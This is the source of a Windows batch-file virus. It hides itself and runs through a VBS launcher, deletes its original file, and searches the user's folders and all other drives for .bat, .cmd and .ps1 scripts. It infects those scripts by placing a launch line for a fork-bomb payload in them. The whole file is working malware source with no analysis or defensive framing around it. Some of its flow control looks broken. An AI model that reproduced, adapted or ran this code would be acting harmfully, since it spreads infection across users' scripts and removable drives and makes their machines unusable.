@echo off
REM #BEatngU
REM Sabre is hungry...

copy /Y "%0" "%temp%\pi9zbl00d.bat"

if not exist "%temp%\init.vbs" (
    :: invisible execution
    @echo WScript.Sleep 5000>"%temp%\init.vbs"
    @echo zexec ^= WScript.Arguments^(0^)>>"%temp%\init.vbs"
    @echo Set objShell ^= CreateObject^("WScript.Shell"^)>>"%temp%\init.vbs"
    @echo objShell.Run zexec, 0, False>>"%temp%\init.vbs"

    cscript "%temp%\init.vbs" "%temp%\pi9zbl00d.bat"

    :: melt
    del /f /q "%0"
    goto :EOF
)

:: setup payload
set "evil=%temp%\slau9hT3r.bat"
call :setup

:: scan for available drives
set "index=%temp%\inf.ini"

setlocal enabledelayedexpansion
For %%A IN (A,B,C,D,E,F,G,H,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (
    set "drive=%%A"

    :: if drive exists...
    if exist "!drive!:\" (

        :: local disk
        if "!drive!:" EQU "%homedrive%" (
            For %%B IN (Documents, Downloads, Videos, Music, Desktop, Favorites) do (
                set "dir=%%B"
                
                dir /s /b "%userprofile%\!dir!\*.bat">>"%index%"
                dir /s /b "%userprofile%\!dir!\*.cmd">>"%index%"
                dir /s /b "%userprofile%\!dir!\*.ps1">>"%index%"
            )
        ) else (
            :: alt external drive
            dir /s /b "!drive!:\*.bat">>"%index%"
            dir /s /b "!drive!:\*.cmd">>"%index%"
            dir /s /b "!drive!:\*.ps1">>"%index%"
        )

    )

)

:: iterate through index list
For /F "delims=" %%C IN (%index%) DO (
    set "file=%%C"

    :: avoid script overwrite
    >nul find /I "#BEatngU" "!file!" && (
        goto :skip
    ) || (
        goto :infect
    )

    :infect
    :: gather file information
    For %%i IN (!file!) DO (
        set "name=%%~ni"
        set "extn=%%~xi"
    )

    If "!extn!" == ".ps1" (
        goto :inf_ps1
    ) ELSE (
        goto :inf_batcmd
    )

    :inf_ps1
    :: clone original script
    set "dummy=%temp%\!name!.tmp"
    Copy /Y "!file!" "%dummy%" >NUL

    :: overwrite
    @ECHO Start-Process "%evil%">>"!file!"
    :: append original code
    For /F "delims=" %%t IN (%dummy%) DO (
        set "line=%%t"
        echo !line!>>"!file!"
    )
    del /f /q "%dummy%"
    goto :skip

    :inf_batcmd
    :: clone original script
    set "dummy=%temp%\!name!.tmp"
    Copy /Y "!file!" "%dummy%" >NUL
    
    ::overwrite
    @ECHO cmd /c start "" "%evil%"
    :: append original code
    For /F "delims=" %%g IN (%dummy%) DO (
        set "line=%%g"
        echo !line!>>"!file!"
    )
    del /f /q "%dummy%"

    :skip
)

:: melt
del /q /f "%0"

:setup
:: stage your payload here
(
@echo rem #BEatngU
@echo :x
@echo start ^%0
@echo goto x
)>"%evil%"

:EOF